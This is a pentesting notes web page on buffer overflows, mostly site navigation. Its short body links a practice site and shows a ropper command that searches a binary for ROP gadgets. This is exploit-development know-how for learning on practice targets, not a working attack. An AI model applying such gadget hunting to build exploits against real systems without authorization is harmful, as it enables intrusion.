
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
        <meta name="description" content="A bunch of miscellaneous pentesting and scripting notes">
      
      
        <meta name="author" content="Glasgow">
      
      
      
        <link rel="prev" href="../../Exfiltration/moving_files_between_systems/">
      
      
        <link rel="next" href="../command_injection/">
      
      <link rel="icon" href="../../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.4.3, mkdocs-material-9.1.17">
    
    
      
        <title>Buffer Overflow - Pentesting</title>
      
    
    
      <link rel="stylesheet" href="../../assets/stylesheets/main.26e3688c.min.css">
      
        
        <link rel="stylesheet" href="../../assets/stylesheets/palette.ecc896b0.min.css">
      
      

    
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
      
    
    
    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
    
  </head>
  
  
    
    
    
    
    
    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo">
  
    
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#buffer-overflow" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

  

<header class="md-header md-header--shadow" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href="../.." title="Pentesting" class="md-header__button md-logo" aria-label="Pentesting" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            Pentesting
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              Buffer Overflow
            
          </span>
        </div>
      </div>
    </div>
    
      
    
    
    
      <label class="md-header__button md-icon" for="__search">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
      </label>
      <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
        </button>
      </nav>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list" role="presentation"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
    
    
      <div class="md-header__source">
        <a href="https://github.com/GlasgOWned/PenTesting" title="Go to repository" class="md-source" data-md-component="source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.4.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2023 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"/></svg>
  </div>
  <div class="md-source__repository">
    GlasgOWned/PenTesting
  </div>
</a>
      </div>
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    


<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../.." title="Pentesting" class="md-nav__button md-logo" aria-label="Pentesting" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>

    </a>
    Pentesting
  </label>
  
    <div class="md-nav__source">
      <a href="https://github.com/GlasgOWned/PenTesting" title="Go to repository" class="md-source" data-md-component="source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.4.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2023 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"/></svg>
  </div>
  <div class="md-source__repository">
    GlasgOWned/PenTesting
  </div>
</a>
    </div>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
      

  
  
  
    <li class="md-nav__item">
      <a href="../.." class="md-nav__link">
        PenTesting Resources / Links
      </a>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
      
      
      
        <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
          CTF
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_2">
          <span class="md-nav__icon md-icon"></span>
          CTF
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../CTF/CTFs/" class="md-nav__link">
        CTFs
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../CTF/Forensics_and_Stego/" class="md-nav__link">
        Forensics & Stego
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../CTF/Password_Cracking/" class="md-nav__link">
        Password Cracking
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../CTF/Sites/" class="md-nav__link">
        CTFs, Wargames, and Write-ups
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../CTF/xss/" class="md-nav__link">
        XSS
      </a>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_6" >
      
      
      
        <label class="md-nav__link" for="__nav_2_6" id="__nav_2_6_label" tabindex="0">
          Crypto
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_6_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_2_6">
          <span class="md-nav__icon md-icon"></span>
          Crypto
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../CTF/Crypto/Crypto/" class="md-nav__link">
        Crypto
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../CTF/Crypto/RSA/" class="md-nav__link">
        RSA
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../CTF/Crypto/cipher_types/" class="md-nav__link">
        Cipher types
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
      
      
      
        <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
          Exfiltration
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_3">
          <span class="md-nav__icon md-icon"></span>
          Exfiltration
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Exfiltration/moving_files_between_systems/" class="md-nav__link">
        Moving files between systems
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
    
  
  
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" checked>
      
      
      
        <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
          Exploits and Code Execution
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="true">
        <label class="md-nav__title" for="__nav_4">
          <span class="md-nav__icon md-icon"></span>
          Exploits and Code Execution
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
    
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
      
      
        
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          Buffer Overflow
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="./" class="md-nav__link md-nav__link--active">
        Buffer Overflow
      </a>
      
        

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#ropper" class="md-nav__link">
    ropper
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#one_gadget" class="md-nav__link">
    one_gadget
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#ropgadget" class="md-nav__link">
    ropgadget
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#objdump" class="md-nav__link">
    objdump
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#pwntools-checksec" class="md-nav__link">
    pwntools - checksec
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#pwntools-cyclic" class="md-nav__link">
    pwntools - cyclic
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#dmesg-print-or-control-the-kernel-ring-buffer" class="md-nav__link">
    dmesg - print or control the kernel ring buffer
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#readelf" class="md-nav__link">
    readelf
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#gdb" class="md-nav__link">
    GDB:
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#vmmap" class="md-nav__link">
    vmmap
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#rabin2" class="md-nav__link">
    Rabin2
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#calling-conventions" class="md-nav__link">
    Calling Conventions
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#miscellaneous-notes" class="md-nav__link">
    Miscellaneous notes:
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#resources" class="md-nav__link">
    Resources:
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#write-ups" class="md-nav__link">
    Write-ups
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#to-sort" class="md-nav__link">
    To Sort:
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#my-initial-attempts-at-the-bof" class="md-nav__link">
    My initial attempts at the BoF
  </a>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../command_injection/" class="md-nav__link">
        Command Injection
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../restricted_shell_escape/" class="md-nav__link">
        Escaping restricted shells
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../reverse_shells/" class="md-nav__link">
        Reverse Shell Cheat Sheet
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" >
      
      
      
        <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="0">
          Linux
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_5">
          <span class="md-nav__icon md-icon"></span>
          Linux
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Linux/command_line_prompt/" class="md-nav__link">
        Command line prompt
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Linux/useful_linux_commands/" class="md-nav__link">
        Useful Linux Commands
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6" >
      
      
      
        <label class="md-nav__link" for="__nav_6" id="__nav_6_label" tabindex="0">
          Recon and Enumeration
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_6">
          <span class="md-nav__icon md-icon"></span>
          Recon and Enumeration
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Recon_and_Enumeration/" class="md-nav__link">
        Recon and Enumeration
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Recon_and_Enumeration/networking/" class="md-nav__link">
        Networking
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7" >
      
      
      
        <label class="md-nav__link" for="__nav_7" id="__nav_7_label" tabindex="0">
          Resources
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_7">
          <span class="md-nav__icon md-icon"></span>
          Resources
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Resources/links_and_references/" class="md-nav__link">
        bookmarks and reading
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8" >
      
      
      
        <label class="md-nav__link" for="__nav_8" id="__nav_8_label" tabindex="0">
          Reversing
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_8_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_8">
          <span class="md-nav__icon md-icon"></span>
          Reversing
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Reversing/Reversing/" class="md-nav__link">
        Reversing
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Reversing/radare2/" class="md-nav__link">
        radare2
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_9" >
      
      
      
        <label class="md-nav__link" for="__nav_9" id="__nav_9_label" tabindex="0">
          Windows
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_9_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_9">
          <span class="md-nav__icon md-icon"></span>
          Windows
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Windows/Powershell/" class="md-nav__link">
        Windows (Powershell & cmd)
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Windows/UAC_Firewall_Defender_bypass/" class="md-nav__link">
        UAC Firewall Defender bypass
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Windows/powershell_to_sort/" class="md-nav__link">
        Powershell to sort
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_10" >
      
      
      
        <label class="md-nav__link" for="__nav_10" id="__nav_10_label" tabindex="0">
          Kali setup and installs
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_10_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_10">
          <span class="md-nav__icon md-icon"></span>
          Kali setup and installs
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../kali_setup_and_installs/" class="md-nav__link">
        Kali setup and installs
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../kali_setup_and_installs/desktop_environments/" class="md-nav__link">
        Change Kali Desktop Environment:
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../kali_setup_and_installs/packages_and_installs/" class="md-nav__link">
        Packages and Installs
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_11" >
      
      
      
        <label class="md-nav__link" for="__nav_11" id="__nav_11_label" tabindex="0">
          Miscellaneous
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_11_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_11">
          <span class="md-nav__icon md-icon"></span>
          Miscellaneous
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../miscellaneous/docker/" class="md-nav__link">
        Docker
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../miscellaneous/email/" class="md-nav__link">
        Email
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../miscellaneous/grep/" class="md-nav__link">
        Grep
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../miscellaneous/jq_syntax/" class="md-nav__link">
        Jq syntax
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../miscellaneous/markdown/" class="md-nav__link">
        Markdown
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../miscellaneous/misc/" class="md-nav__link">
        Miscellaneous stuff to be sorted later
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../miscellaneous/perl/" class="md-nav__link">
        Perl
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../miscellaneous/php/" class="md-nav__link">
        Php
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../miscellaneous/regular_expressions/" class="md-nav__link">
        Regular Expressions
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../miscellaneous/tmux/" class="md-nav__link">
        Tmux
      </a>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_11_11" >
      
      
      
        <label class="md-nav__link" for="__nav_11_11" id="__nav_11_11_label" tabindex="0">
          Python
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_11_11_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_11_11">
          <span class="md-nav__icon md-icon"></span>
          Python
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../miscellaneous/Python/" class="md-nav__link">
        Python
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../miscellaneous/Python/python_server/" class="md-nav__link">
        Python web server examples
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../miscellaneous/Python/python_to_sort/" class="md-nav__link">
        Python to sort
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../miscellaneous/Python/requests_and_beautifulsoup/" class="md-nav__link">
        Requests and beautifulsoup
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_11_12" >
      
      
      
        <label class="md-nav__link" for="__nav_11_12" id="__nav_11_12_label" tabindex="0">
          To sort
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_11_12_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_11_12">
          <span class="md-nav__icon md-icon"></span>
          To sort
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../miscellaneous/to_sort/Snippets/" class="md-nav__link">
        Snippets
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../miscellaneous/to_sort/atom_to_sort/" class="md-nav__link">
        Atom to sort
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../miscellaneous/to_sort/git_to_sort/" class="md-nav__link">
        Git to sort
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../miscellaneous/to_sort/misc_to_be_sorted/" class="md-nav__link">
        Misc to be sorted
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../miscellaneous/to_sort/to_sort/" class="md-nav__link">
        To sort
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../miscellaneous/to_sort/virtualbox_to_sort/" class="md-nav__link">
        Virtualbox to sort
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#ropper" class="md-nav__link">
    ropper
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#one_gadget" class="md-nav__link">
    one_gadget
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#ropgadget" class="md-nav__link">
    ropgadget
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#objdump" class="md-nav__link">
    objdump
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#pwntools-checksec" class="md-nav__link">
    pwntools - checksec
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#pwntools-cyclic" class="md-nav__link">
    pwntools - cyclic
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#dmesg-print-or-control-the-kernel-ring-buffer" class="md-nav__link">
    dmesg - print or control the kernel ring buffer
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#readelf" class="md-nav__link">
    readelf
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#gdb" class="md-nav__link">
    GDB:
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#vmmap" class="md-nav__link">
    vmmap
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#rabin2" class="md-nav__link">
    Rabin2
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#calling-conventions" class="md-nav__link">
    Calling Conventions
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#miscellaneous-notes" class="md-nav__link">
    Miscellaneous notes:
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#resources" class="md-nav__link">
    Resources:
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#write-ups" class="md-nav__link">
    Write-ups
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#to-sort" class="md-nav__link">
    To Sort:
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#my-initial-attempts-at-the-bof" class="md-nav__link">
    My initial attempts at the BoF
  </a>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          
            <div class="md-content" data-md-component="content">
              <article class="md-content__inner md-typeset">
                
                  

  
  


<h1 id="buffer-overflow">Buffer Overflow<a class="headerlink" href="#buffer-overflow" title="Permanent link">&para;</a></h1>
<p>Practice sites:
* <a href="https://exploit.education/">https://exploit.education/</a></p>
<p>buffer overflow tools:</p>
<h4 id="ropper">ropper<a class="headerlink" href="#ropper" title="Permanent link">&para;</a></h4>
<p>used to get rop chains</p>
<div class="codehilite"><pre><span></span><code>ropper --file garbage  | grep &quot;pop&quot;
apt-get install ropper
</code></pre></div>

